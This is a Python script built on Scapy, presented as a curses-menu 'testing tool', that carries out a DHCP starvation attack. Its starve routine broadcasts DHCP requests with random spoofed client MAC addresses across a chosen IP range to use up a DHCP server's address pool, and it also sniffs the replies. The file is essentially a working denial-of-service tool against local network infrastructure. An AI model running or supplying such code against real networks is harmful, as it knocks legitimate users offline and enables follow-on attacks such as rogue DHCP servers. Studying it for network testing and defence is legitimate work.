#!/usr/bin/python3

from scapy.all import *
import multiprocessing 
from time import sleep
import curses
import os
from ipaddress import IPv4Address


# configuration
LOCALIFACE = 'wlan0'
REQUESTMAC = 'b8:27:eb:24:38:86'
MYHOSTNAME='host'
LOCALMAC = get_if_hwaddr(LOCALIFACE)
LOCALMACRAW = bytes.fromhex(REQUESTMAC.replace(':',''))


class DhcpStarve:
    def __init__(self):
        '''Preparation'''
        self.starvedIPs = []
    
    def listen(self):
        '''Sniff for dhcp packets.'''
        sniff(filter="udp and (port 67 or port 68)",
              prn=self.handle_dhcp,
              store=0)
              
    def handle_dhcp(self, pkt):
        '''Reacts to dhcp response.'''
        if pkt[DHCP]:         
            if pkt[DHCP].options[0][1]==5:                 #5 is DHCPACK
                self.starvedIPs.append(pkt[IP].dst)
                print(str(pkt[IP].dst)+" succesfully registered")
            elif pkt[DHCP].options[0][1]==6:               #6 is DHCPNAK
                print("NAK received: ", end="")
                print(pkt[DHCP].options[2][1].decode())    #error msg
            elif pkt[DHCP].options[0][1]==2:               #6 is DHCPNAK
                print("Offer received: ")
                print(pkt[DHCP].options)    #error msg
        else:
            print(pkt.display())

    def _sniffWrapper(sendPacketMethod):
        '''Launches sniffing process around another passed method'''
        def wrapper(self, *args, **kwargs):
            listenProcess = multiprocessing.Process(target=self.listen)
            listenProcess.start()
            sleep(0.5)
            sendPacketMethod(self, *args, **kwargs)
            sleep(0.5)
            listenProcess.terminate()
            input('Press any key...')
        return wrapper  
 
    @_sniffWrapper
    def discover(self):
        '''Use method to send dhcp discover.'''
        # craft DHCP DISCOVER
        dhcpDiscover = Ether(src=LOCALMAC, dst='ff:ff:ff:ff:ff:ff')
        dhcpDiscover/= IP(src='0.0.0.0', dst='255.255.255.255')
        dhcpDiscover/= UDP(dport=67, sport=68)
        dhcpDiscover/= BOOTP(chaddr=LOCALMACRAW,xid=RandInt())
        dhcpDiscover/= DHCP(options=[('message-type', 'discover'), 'end'])
        # start listening and send packet
        sendp(dhcpDiscover,iface=LOCALIFACE)  
        
    @_sniffWrapper
    def starve(self,startIP,limit):
        '''Generate DHCP requests in loop'''
        for requestedIP in self.nextIP(startIP,limit):
            dhcpRequest = Ether(src=LOCALMAC, dst='ff:ff:ff:ff:ff:ff')
            dhcpRequest/= IP(src='0.0.0.0', dst='255.255.255.255')
            dhcpRequest/= UDP(dport=67, sport=68)
            dhcpRequest/= BOOTP(chaddr=RandString(12, b"0123456789abcdef"),xid=RandInt())
            dhcpRequest /= DHCP(options=[("message-type", "request"),
                                             ("requested_addr", requestedIP),
                                             ("server_id", "192.168.31.1"),
                                             "end"])
            dhcpResp = sendp(dhcpRequest,iface=LOCALIFACE)
            print('Requesting for IP: {}'.format(requestedIP))
            sleep(0.5)
    
    def nextIP(self,startIP,limit):
        '''Provides next ip addresses from some start IP, number of given addresses is limited'''
        for i in range(limit):
            try: 
                ip = IPv4Address(startIP) + i   
            except Exception as e:
                print(e)
                break
            yield IPv4Address(startIP) + i
    
    def nextIP_old(self,startIP,limit):
        '''returns generator which gives next ip addresses from some starting IP, limit is number of ips to give'''
        for i in range(limit):
            ipOctets = startIP.split('.')
            ipBin = ''.join([str(format(int(octet),'08b')) for octet in ipOctets])
            nextIPint = int(ipBin, base=2) + i
            nextIPbin = str(format(nextIPint,'032b'))
            nextOctets = [ nextIPbin[index:index+8] for index,bit in enumerate(nextIPbin) if not index%8 ]
            nextOctetsInt = [str(int(octet,base=2)) for octet in nextOctets] 
            yield ('.'.join(nextOctetsInt))

class Menu:
    '''Menu made with curses'''
    def __init__(self,menuItems):
        '''Declaration of strings'''
        self.title = "Testing tool based on Scapy"
        self.menuItemsHint = "Choose an option or press q to quit:"
        self.menuItems = menuItems
        self.subtitle = "v0.1 written by Jarek J"
        curses.wrapper(self.drawMenu)
        
    def drawMenu(self,stdscr):
        '''Draws menu with curses'''
        key = 0
        self.menuHighlight=0
        self.stdscr = stdscr
        # Clear and refresh the screen for a blank canvas
        self.stdscr.clear()
        self.stdscr.refresh()
        curses.curs_set(0) #hide cursor

        # Start colors in curses
        curses.start_color()
        curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_BLACK, curses.COLOR_WHITE)
        curses.init_pair(4, curses.COLOR_BLACK, curses.COLOR_GREEN) #selected menu line

        # Initialization
        self.stdscr.clear()
        height, width = self.stdscr.getmaxyx()


        while (key != ord('q')): 
            # Centering calculations
            self.start_x_title = int((width // 2) - (len(self.title) // 2) - len(self.title) % 2)
            start_x_subtitle = int((width // 2) - (len(self.subtitle) // 2) - len(self.subtitle) % 2)
            self.start_y = int((height // 2) - 10)
            
            #menu actions:
            if   key == curses.KEY_DOWN and self.menuHighlight < len(self.menuItems)-1:  self.menuHighlight += 1
            elif key == curses.KEY_UP and self.menuHighlight > 0:                        self.menuHighlight -= 1
            if   key == 10 and self.menuHighlight == 0:                     #10 is ENTER
                self.chooseStarving() 
            if   key == 10 and self.menuHighlight == 1:                     
                self.chooseDiscover()                                         
             
            # Render status bar
            self.stdscr.attron(curses.color_pair(3))
            self.stdscr.attroff(curses.color_pair(3))

            # print texts
            self.stdscr.attron(curses.color_pair(2))
            self.stdscr.attron(curses.A_BOLD)
            self.stdscr.addstr(self.start_y, self.start_x_title, self.title)
            self.stdscr.attroff(curses.color_pair(2))
            self.stdscr.attroff(curses.A_BOLD)

            self.stdscr.addstr(self.start_y + 2, self.start_x_title, self.menuItemsHint)

            for index,line in enumerate(self.menuItems): #menu
                if index == self.menuHighlight: self.stdscr.attron(curses.color_pair(4))
                self.stdscr.addstr(self.start_y + index+4, self.start_x_title, line)
                if index == self.menuHighlight: self.stdscr.attroff(curses.color_pair(4))

            self.stdscr.addstr(self.start_y + len(self.menuItems)+6, self.start_x_title, '-' * len(self.subtitle))
            self.stdscr.addstr(self.start_y + len(self.menuItems)+7, self.start_x_title, self.subtitle)

            #refresh and wait for input
            self.stdscr.refresh()
            key = self.stdscr.getch()
        curses.endwin()
        os._exit(0)
      
    def stringInput(self,stdscr, x, y, prompt):
        '''Displays prompt and returns user input (on x/y coordinates)'''
        curses.echo() 
        self.stdscr.addstr(y, x, prompt)
        self.stdscr.refresh()
        input = self.stdscr.getstr(y, x+len(prompt), 20)
        self.stdscr.move(y,x)
        self.stdscr.clrtoeol()
        return input  
    
    def chooseStarving(self):
        '''Initiate dhcp Starve menu option'''
        startIP = self.stringInput(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter start IP: ')
        limit = self.stringInput(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter limit of IPs: ')
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.starve(startIP.decode(),int(limit))
        
    def chooseDiscover(self):
        '''Initiate dhcp discover menu option'''
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.discover()
        
def main():
    while 1:
        menuObj = Menu(['DHCP Starve', 'DHCP Discover', 'Unused option 3'])
        
if __name__ == '__main__':
	main()

